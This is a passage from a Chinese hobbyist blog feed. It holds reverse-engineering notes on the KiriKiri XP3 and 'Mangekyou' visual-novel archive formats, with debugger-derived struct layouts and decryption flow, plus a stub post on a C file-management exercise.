class="number">0x14</span>]:xor的key值 DWORD</span><br></pre></td></tr></table></figure><p>至于0~0xC的部分是什么还不是很清楚<br>看官方结构体的意思应该是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[esi+<span class="number">0x0</span>]: 结构体大小 DWORD</span><br><span class="line">[esi+<span class="number">0x4</span>]: ? QWORD</span><br></pre></td></tr></table></figure><p>但这个QWORD后面动调看每次都是0?<br>总:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[esi+<span class="number">0x0</span>]: 结构体大小 DWORD</span><br><span class="line">[esi+<span class="number">0x4</span>]: ? QWORD</span><br><span class="line">[esi+<span class="number">0xC</span>]: 数组偏移 DWORD</span><br><span class="line">[esi+<span class="number">0x10</span>]:size DWORD</span><br><span class="line">[esi+<span class="number">0x14</span>]:xor的key值 DWORD</span><br></pre></td></tr></table></figure><p>x32dbg在10001000下个断点跟踪 看内存布局<br>18 00 00 00 00 00 00 00 00 00 00 00 3A FD 19 00<br>02 00 00 00 D4 88 EA AC 88 00 00 00 02 00 00 00 </p><p>对应着看就很清晰了<br>现在关注的点就是程序是在哪一步读取的数据<br>硬件断点定位到前面关注过的一处memcpy<br><img src="/xp3%E9%80%86%E5%90%91/images/image-12.png" alt="img"><br>但各个内存数据对应关系不是很直接<br>data.xp3读的不是readfile读的 readfile读的与memcpy的有偏移<br>猜测应该是还有个结构体成员等来读取偏移<br>这个偏移的计算有点复杂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax [ebx+<span class="number">0x38</span>]</span><br><span class="line">mov edx [ebx+<span class="number">0x40</span>]</span><br><span class="line">add eax [edx+<span class="number">0x8</span>]</span><br><span class="line">=&gt;</span><br><span class="line">[ebx+<span class="number">0x38</span>]+[[ebx+<span class="number">0x40</span>]+<span class="number">0x8</span>]</span><br></pre></td></tr></table></figure><p>这间接调用就恶心人了..</p><p>动调找了找三者关系 还是不是很明晰… 改天吧…</p><p>这里找到一个xp3解包介绍<br><a href="https://galgamer.moe/article/20022">https://galgamer.moe/article/20022</a><br><a href="https://galgamer.moe/article/20021">https://galgamer.moe/article/20021</a></p><p>深有感触<br><img src="/xp3%E9%80%86%E5%90%91/images/image-13.png" alt="img"></p><p>看了看源码 发现确实存在compress 操作<br>看文章分析知道是 <code>先加密再压缩</code><br>所以对应不上是因为存在解压缩的操作…<br>这就难搞了… 毕竟C不调用库自己写解压缩有点困难…<br>…<br>这么比较起来 <code>qlie</code>引擎算简单的? 但也不能这么说 比较krkr开源 有很多很多人研究过 引擎被挖的比较透<br>… 难搞 …<br>有时间跟着这两篇文章走一遍 思路是很值得学习的<br>通过已有的封包来进行不同程度&#x2F;顺序的加密 然后比较格式</p><h2 id="硬逆"><a href="#硬逆" class="headerlink" title="硬逆"></a>硬逆</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>PE32 无壳<br>又是WinMain写的…</p><p>用hex看fgimage 甚至没有加密?<br>还是说保留了文件头不加密?<br><img src="/xp3%E9%80%86%E5%90%91/images/image-9.png" alt="img"></p><h1 id="Uncover-XP3"><a href="#Uncover-XP3" class="headerlink" title="Uncover XP3"></a>Uncover XP3</h1><p>跟着找到的一篇很详细的讲解XP3结构 以及如何实操来验证推断的文章进行学习<br><a href="https://galgamer.moe/article/20021">前篇</a><br><a href="https://galgamer.moe/article/20022">后篇</a></p><p>还得是Google大法好 国内搜索根本找不到实质性讲解原理的内容 全是一大堆<code>超详细!利用xxx工具进行解包封包</code>这种低质量文章<br>看来以后逆向工程国内就看看52pj 其他的都逛国外论坛算了…</p><p>言归正传 开逆！</p><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><ol><li>合理利用已有开源工具</li><li>用引擎不同打包方式得到文件进行对比分析</li></ol><p>由于一直忽视了XP3引擎还有压缩处理 逆向调试时遇到很多数据不对应的情况…<br>所以先把引擎研究透 再来逆向</p><h1 id="实操复现-1"><a href="#实操复现-1" class="headerlink" title="实操复现"></a>实操复现</h1><p>既是学习记录也是实操复现(跟着流程走一遍)<br>记载下我自己的一些理解 以后深入研究更方便</p><h2 id="Chapter1-由来"><a href="#Chapter1-由来" class="headerlink" title="Chapter1 由来"></a>Chapter1 由来</h2><p>我就写我的了<br>为什么想要逆XP3? 因为这是我接触的最早的galgame (花吻在上)的引擎<br>再加上后续像千恋万花这种柚子社的也都是基于xp3<br>花吻跟我的震撼让我还是想彻底搞明白这个引擎的</p><h2 id="Chapter2-研究方向"><a href="#Chapter2-研究方向" class="headerlink" title="Chapter2 研究方向"></a>Chapter2 研究方向</h2><p>挺认同这段话的<br><img src="/xp3%E9%80%86%E5%90%91/images/image-14.png" alt="img"></p><p><strong>啃别人的代码比啃屎还难受啊！</strong></p><h3 id="已知-可用工具-etc"><a href="#已知-可用工具-etc" class="headerlink" title="已知&#x2F;可用工具 etc"></a>已知&#x2F;可用工具 etc</h3><ol><li>激活版010 Editor 主要是修改和对比特别方便</li><li>GARbro  Github开源项目 但是我的NET版本不够 vs生成不了… 还是借着另一位师傅的vs make的</li><li>krkr官方xp3打包器 在KiriKiri2开发包下 (再次吐槽国内搜索引擎… 找个开源开发包都<strong>完全</strong>搜不到!!! 全是sb站的xxx文章)</li><li>krkr-xp3  一个开源的XP3解包打包器 方便用来研究XP3文件格式  跟一些elf_parser很类似的功能</li></ol><p>掌握的情报(…)</p><ol><li>XP3支持包含文件和目录</li><li>XP3支持存储文件名</li><li>XP3支持针对文件的压缩</li><li>XP3支持基于文件的加密</li><li>XP3支持对索引的压缩 (何解?)</li><li>Nope…</li></ol><p>接下来的一个思路就很棒了 将XP3文件与zip格式对比<br>可以大致知道这种压缩类文件的格式:<br>1.第一个文件头部<br>2.第一个文件<br>3.第二个文件头部<br>4.第二个文件<br>5.……<br>6.第n个文件头部<br>7.第n个文件<br>8.索引<br>9.索引尾部</p><p>逆过万华镜也知道 这种管理是比较高效的 也很好用结构体来实现</p><p>下面来了解一下这几个工具<br>GARbro<br>长这个样子<br><img src="/xp3%E9%80%86%E5%90%91/images/image-15.png" alt="img"><br>可以看到有很多option可以选<br>当我看到语言包有russian的时候 不会是俄罗斯老哥写的吧?</p><p>官方release:<br><img src="/xp3%E9%80%86%E5%90%91/images/image-16.png" alt="img"><br>兼容性很难绷… 尽可能不用吧…</p><h2 id="Chapter3-实验过程"><a href="#Chapter3-实验过程" class="headerlink" title="Chapter3 实验过程"></a>Chapter3 实验过程</h2><p>这部分开始就是以前逆向时忽略的点了 <strong>压缩</strong><br>目的: 确定XP3文件的性质和结构<br>先通过无加密无压缩的XP3搞清楚最基本的结构 再探索有压缩有加密的结构</p><h3 id="压缩算法实验"><a href="#压缩算法实验" class="headerlink" title="压缩算法实验"></a>压缩算法实验</h3><p>确定XP3封包中使用的压缩方法<br>怎么确定呢?<br><strong>将压缩后的 XP3 数据和使用 Bandizip 压缩后的数据进行对比，以确定压缩算法.</strong></p><p>krkr-xp3的python代码中引入了zlib库<br>并且level设置的为9<br><img src="/xp3%E9%80%86%E5%90%91/images/image-17.png" alt="img"><br>结合zlib based on GNU zip 我们尝试bandzip以最大级别gz压缩一个test.txt<br>然后再用GARbro&#x2F;官方 封包来封<br>010对比</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>A simple FileManagementSystem implemented in C</title>
      <link href="/A-simple-FileManagementSystem-implemented-in-C/"/>
      <url>/A-simple-FileManagementSystem-implemented-in-C/</url>
      
        <content type="html"><![CDATA[<p>After finishing reversing BishoujouMangekyou-5, it exposes my weakness : poor programming experience in operating <code>File</code>…<br>Therefore, a simple exercise may help~</p><p><a href="https://www.cnblogs.com/luogxbye/p/14304554.html">Reference</a></p><h1 id="Purpose-And-Request"><a href="#Purpose-And-Request" class="headerlink" title="Purpose And Request"></a>Purpose And Request</h1><p>Purpose: be familiar with <code>File</code> operation</p><p>Request:</p><ol><li><code>n</code> users <code>m</code> files for each user</li><li>One limited file only at a time</li><li>System should check the accuracy of commands and show the fail reasons if error occuring</li><li>Should have <code>Permission Management Mechanism</code>, allowing <code>root</code> to modify the permission.</li><li>Least requirement of operations: <code>Create</code>, <code>Delete</code>, <code>Open</code>, <code>Close</code>, <code>Read</code>, <code>Write</code>. Of course I will extend it ~</li></ol><h1 id="Data-Structrue"><a href="#Data-Structrue" class="headerlink" title="Data Structrue"></a>Data Structrue</h1><h1 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>万华镜逆向</title>
      <link href="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/"/>
      <url>/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<p>慢慢磨吧… x32dbg再开一次<br>第一遍熟悉了大概流程 接下来就是逐步完善细节</p><p>函数没有任何难点 难的在于各个结构体的结构以及偏移量！！！<br>还有函数层次关系…</p><p>IDA和x32dbg的base是一样的 互相照着看方便~</p><p>笑死 先前逆的是2… 教程用的2.2… 又下了一个 确实各个数据应该都能对上了</p><h1 id="几个关键结构体"><a href="#几个关键结构体" class="headerlink" title="几个关键结构体"></a>几个关键结构体</h1><h2 id="FilePackVer"><a href="#FilePackVer" class="headerlink" title="FilePackVer"></a>FilePackVer</h2><p>地址:<br>结构:<br>46 69 6C 65 50 61 63 6B 56 65 72 33 2E 31 00 00<br>12 00 00 00 35 01 4D 02 00 00 00 00</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">FilePack</span>&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x10</span>];</span><br><span class="line">    DWORD size;</span><br><span class="line">    QWORD EntryPoint;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HashData"><a href="#HashData" class="headerlink" title="HashData"></a>HashData</h2><p>结构:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HashData</span>&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x20</span>]; <span class="comment">//8hr...</span></span><br><span class="line">    DWORD offset; <span class="comment">// 028D</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x100</span>]; <span class="comment">//256字节数据</span></span><br><span class="line">    DWORD unk; <span class="comment">//先前检验data后一个字节 &lt;0||&gt;8就设置为0</span></span><br><span class="line">    <span class="type">char</span> Blank[<span class="number">0x2F8</span>] <span class="comment">//空字节占位</span></span><br><span class="line">    FilePack filepack; <span class="comment">// FilePack结构体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HashVer"><a href="#HashVer" class="headerlink" title="HashVer"></a>HashVer</h2><p>地址: 0296C5B0<br>结构:<br>48 61 73 68 56 65 72 31 2E 34 00 00 00 00 00 00<br>00 01 00 00 12 00 00 00 48 00 00 00 49 02 00 00<br>01 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>00 00 00 00 BE 77 EB 74 8E 27 A8 8B A1 45 8E A6</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HashVer</span>&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x10</span>]; <span class="comment">// HashVer1.4</span></span><br><span class="line">    DWORD table_size;  <span class="comment">// 100h 可能是表的大小???</span></span><br><span class="line">    DWORD file_cnt; <span class="comment">// 12h</span></span><br><span class="line">    DWORD unk; <span class="comment">// 48h</span></span><br><span class="line">    DWORD dataSize; <span class="comment">// 249h</span></span><br><span class="line">    DWORD signal; <span class="comment">// 标志位 1 则decrypt2</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x249</span>]; <span class="comment">// 加密的数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Decrypt2DataHead"><a href="#Decrypt2DataHead" class="headerlink" title="Decrypt2DataHead"></a>Decrypt2DataHead</h2><p>地址: 028D8120<br>结构:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Decrypt2DataHead</span>&#123;</span><br><span class="line">    DWORD sign; <span class="comment">//FF435031</span></span><br><span class="line">    DWORD isWord; <span class="comment">// 1:unsigned __int16</span></span><br><span class="line">    DWORD size; <span class="comment">// 922h</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="FileEntry"><a href="#FileEntry" class="headerlink" title="FileEntry"></a>FileEntry</h2><p>结构:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">FileEntry</span>&#123;</span><br><span class="line">    QWORD offset; <span class="comment">// DWORD2:DWORD1</span></span><br><span class="line">    DWORD size;</span><br><span class="line">    DWORD decrypted_size; <span class="comment">// 解密后的size</span></span><br><span class="line">    DWORD isCompressed; <span class="comment">// 0/1 标志位</span></span><br><span class="line">    DWORD unk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="近月2-流程梳理"><a href="#近月2-流程梳理" class="headerlink" title="近月2 流程梳理"></a>近月2 流程梳理</h1><h2 id="FilePack"><a href="#FilePack" class="headerlink" title="FilePack"></a>FilePack</h2><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image.png" alt="img"><br>注意把 setfilepointer打开!!! 这里设置文件指针是设置源文件的 也就是data0.pack的地址<br>看日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">设置文件指针  句柄:370 偏移量:00  基准:2</span><br><span class="line">设置文件指针  句柄:370 偏移量:00  基准:0</span><br><span class="line">设置文件指针  句柄:370 偏移量:024D0DE0  基准:0</span><br><span class="line">读取文件:  句柄:370 缓冲:19FAF7 字节数:1C</span><br></pre></td></tr></table></figure><p>读取的就是文件最末的0x1C字节数据<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-1.png" alt="img"><br>结合前面走弯路逆错文件的经验 可以分析出大致结构<br>开头的是<code>FilePack</code>的签名 后面<code>12 00 00 00</code> 应该是size之类的<br>然后的 <code>35 01 4D 02</code> 跟右边的offset很像 所以应该是某个入口点的指针 最后一个DWORD的0不知道什么含义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">FilePack</span>&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x10</span>]; <span class="comment">// version</span></span><br><span class="line">    DWORD size; <span class="comment">// ? unsure of which</span></span><br><span class="line">    DWORD EntryAddress; <span class="comment">// probably</span></span><br><span class="line">    DOWRD unknown; <span class="comment">// 0?</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回x32dbg 跳出这个函数 把上下的函数借助IDA写上标签便于识别<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-2.png" alt="img"><br>注意到取了前0x10 来验签</p><h3 id="文件读取初始化"><a href="#文件读取初始化" class="headerlink" title="文件读取初始化"></a>文件读取初始化</h3><p>步进文件读取初始化的函数里<br>IDA可以很清楚的看清函数结构 关注SetPoint的日志<br><code>设置文件指针  句柄:370 偏移量:024D09BC  基准:0</code><br>然后后面Read 继续看日志<br><code>读取文件:  句柄:370 缓冲:19F684 字节数:440</code><br>跟踪出来发现确实从data0.pack <code>024D09BC</code>处读取了440(0x124)字节数据<br>其实往上翻翻可以发现这个在一个开头为 <code>HashVer1.4</code>的结构体的最末</p><p>Read过后做了一个比较奇怪的check: 检查检查结尾后的第一个byte是否<code>&gt;=0 &lt;=8</code> 若否就置为0<br>然后取eax:起始位置+24h 复制了0x100的数据到<code>[ecx+ebx+0x54]</code>的内存<br>后面就开始有计算hash和decrypt的了 结合IDA和动调<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-3.png" alt="img"><br>然后就是取0x20字节转unicode后与 <code>8hr48uky,8ugi8ewra4g8d5vbf5hb5s6</code>对比<br>其中关于Hash的计算以及decrypt的算法IDA一目了然 不需要过多深入的分析 解密时IDA开一个AutoComment照着XMM指令集写即可<br>可能其中会涉及到一些间接调用之类的 动调找也比较好找</p><p>这里发现只需要进入decrypt动调一些值即可<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-4.png" alt="img"><br>这里一个是长度 另一个就是先前计算得到的hash值 <code>0658D1A0</code><br>其实和先前的hash有一点点小区别? 动调得到的hash函数返回eax是 <code>D658D1A0</code><br>这样初始的 <code>*(_DWORD *)(a1 + 8)</code>和 <code>*(_DWORD *)(a1 - 4)</code>就得到了<br>还有一个 <code>*(__m64 **)(a1 - 8)</code> 动调发现是一个指向先前读取440字节数据的指针 也就是我们的解密源数据<br>然后取了0x20来解密<br>解出来的就是 <code>8hrxxx</code> 然后转unicode 验签</p><p>然后进行了一大堆赋值操作 注意细看<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-5.png" alt="img"><br>结合cdq我们可以知道 <code>FilePack</code>里面的Entry应该是QWORD类型 而且只有三个成员<br>所以可以写出<code>FilePack</code>结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">FilePack</span>&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x10</span>];</span><br><span class="line">    DWORD size;</span><br><span class="line">    QWORD EntryPoint;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后又开始设置文件指针<br><code>设置文件指针  句柄:35C 偏移量:024D072F  基准:0</code><br>指向的正是data0中的HashVer结构体<br>然后调用CopyFrom 接着又构造了一个类<br>然后看日志发现 <code>读取文件:  句柄:35C 缓冲:296C5B0 字节数:28D</code><br>查看对应内存<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-6.png" alt="img"><br>所以前面从data0复制HashVer到内存中</p><p>现在来关注之前取出的440字节的数据 不妨称作 HashData 因为Hash解密出一个签名<br>然后有个很关键的是签名后的第一个DWORD: 028D 是后面计算地址的offset</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HashData</span>&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x20</span>]; <span class="comment">//8hr...</span></span><br><span class="line">    DWORD offset; <span class="comment">// 028D</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x100</span>]; <span class="comment">//256字节数据</span></span><br><span class="line">    DWORD unk; <span class="comment">//先前检验data后一个字节 &lt;0||&gt;8就设置为0</span></span><br><span class="line">    <span class="type">char</span> Blank[<span class="number">0x2F8</span>] <span class="comment">//空字节占位</span></span><br><span class="line">    FilePack filepack; <span class="comment">// FilePack结构体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关注一下怎么通过 HashData找到HashVer的<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-7.png" alt="img"><br>可以看到先是取出offset 028D 然后用HashData的地址去索引HashVer</p><p>接下来关注对HashVer结构体作了什么操作<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-8.png" alt="img"><br>前面构造的类的指针是指向<code>HashVer</code>开头 所以可以确定下面是对这个结构体的处理<br><code>sub_4EB8C0</code>函数在IDA能大致看出功能<br>先验签 然后解密 再Copy回内存<br>验签:<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-9.png" alt="img"><br>对HashVer的数据读取:<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-10.png" alt="img"><br>然后用CopyFrom往类中写入数据<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-11.png" alt="img"><br>发现这个函数还是解出 <code>8hx...</code>的那个 将其重命名为decrypt<br>接下来出现了第二个解密函数<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-12.png" alt="img"></p><p>再看0296C5B0处的HashVer结构体 一些值的作用就清晰了<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-13.png" alt="img"><br>前面调用过GetSize 返回的是 249h 说明hashver后第四个DWORD就是size<br>前面又分析过了第五个DWORD是标志位 决定是否调用decrypt2</p><p>所以解密流程就是先对hashver的数据用decrypt解密 若标志位为1 继续进行decrypt2解密<br>decrypt2结合IDA+x32dbg动调数据来理解</p><p>一堆ReadFile 但是并没有调用API 所以需要手动进入找到读的那片内存<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-14.png" alt="img"><br>找几个寄存器试试就找到这块<br>接下来的Read都是在这片内存 028D8120<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-15.png" alt="img"><br>第一个DWORD肯定是验证 第二个多半是标志位 第三个是size<br>这里ReadFile读取的值是存在ecx寄存器里的<br>后面对size进行了一个检查 结合IDA: <code>v17&lt;-[ebp-10h]</code> 也可以确定前面922h就是size</p><p>后面有一些间接寻址操作 结合动调来看<br>从004E5722开始<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-16.png" alt="img"><br>这里动调一下会发现有size 有待解密数据的起始地址 又结合IDA知道这就是 end指针<br><code>idr617538_Move(v10, v11, 256);</code> 这句就是把前面建的[0~255]的表复制一份 原表是v10<br>接下来IDA反编译都比较清晰<br>注意到第85行<code>if ( (v12 &amp; 1) == 1 ) </code> 这里往前翻就知道是读取的第二个DWORD 也就是我们猜测的标志位1<br>其实这里就是一个数据类型格式的check<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-17.png" alt="img"><br>根据不同数据格式来移指针<br>标志位为1代表是WORD类型</p><p>最后注意下虽然看似只有一次if但是后面有个 <code>goto label36</code> 所以是个循环<br>这个循环中套的一个 栈+找index的解密<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-18.png" alt="img"><br>可以通过 <code>v15 &lt;- v15 = (_BYTE *)*((_DWORD *)v16 + 1);</code> 知道v15就是指向以v16起始的空间<br>最后返回解密后的类指针</p><p>为了统一 对这部分解密的数据结构装一个结构体 命名为 Decrypt2DataHead(跟教程一样)<br>因为这是decrypt2之前的头部结构 很容易写出来<br>Decrypt2DataHead:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Decrypt2DataHead</span>&#123;</span><br><span class="line">    DWORD sign; <span class="comment">//FF435031</span></span><br><span class="line">    DWORD isWord; <span class="comment">// 1:unsigned __int16</span></span><br><span class="line">    DWORD size; <span class="comment">// 922h</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到解密数据的内存 028DA150 然后跑完decrypt2<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-19.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-20.png" alt="img"></p><p>解出来的都是文件名 所以HashVer的数据存的应该是这个pack里打包的文件名<br>可以数下有多少个文件 18个 12h 刚好对应HashVer的第二个Dword 同时也跟FilePack里的size对应上了<br>HashVer的结构:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HashVer</span>&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x10</span>]; <span class="comment">// HashVer1.4</span></span><br><span class="line">    DWORD table_size;  <span class="comment">// 100h 可能是表的大小???</span></span><br><span class="line">    DWORD file_cnt; <span class="comment">// 12h</span></span><br><span class="line">    DWORD unk; <span class="comment">// 48h</span></span><br><span class="line">    DWORD dataSize; <span class="comment">// 249h</span></span><br><span class="line">    DWORD signal; <span class="comment">// 标志位 1 则decrypt2</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x249</span>]; <span class="comment">// 加密的数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跳出函数 回到 4EDA1B<br>现在我们还在文件读取初始化函数中 刚刚结束了验签+解密数据等操作<br>然后新设置了文件指针 <code>设置文件指针  句柄:350 偏移量:024D0135  基准:0</code><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-21.png" alt="img"><br>发现就是 <code>FilePack</code>的几个数据 size和EnrtyPoint<br>然后进行了一个 12次(size次)的循环 那么应该就是分别解密每个文件的数据了<br>IDA可以很直观的看出来:<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-22.png" alt="img"><br><code>sub_4E4C18</code>就是关键的解密函数<br>先IDA看个大概结构<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-23.png" alt="img"><br>动调看一看间接调用即可<br>可以发现这部分指向了HashData<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-24.png" alt="img"><br>注意到传入的第二个参数<code> *(_DWORD *)(*(_DWORD *)v1 + 80)</code> 也就是edx 指向的是之前算出的Hash值 <code>0658D1A0</code><br>然后又ReadFile <code>读取文件:  句柄:364 缓冲:19F642 字节数:2</code><br>读了 <code>00 24</code><br>hashdata前面有一堆 发现是一些版权声明的日文<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-25.png" alt="img"><br>然后又有ReadFile <code>读取文件:  句柄:364 缓冲:2981650 字节数:48</code><br>读的字节数是2*v4 v4的初始值是24h<br>这里的48和HashVer的那个unk的值可能有关联<br>然后就是解密了 IDA很明晰<br>这里v15取的应该是解密数据存放内存的指针(修改了数据格式 unicode转了一下 WORD类型)<br>do-while循环了24h次<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-26.png" alt="img"><br>解密完后回到之前的循环继续下个文件的解密<br>日志打印如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 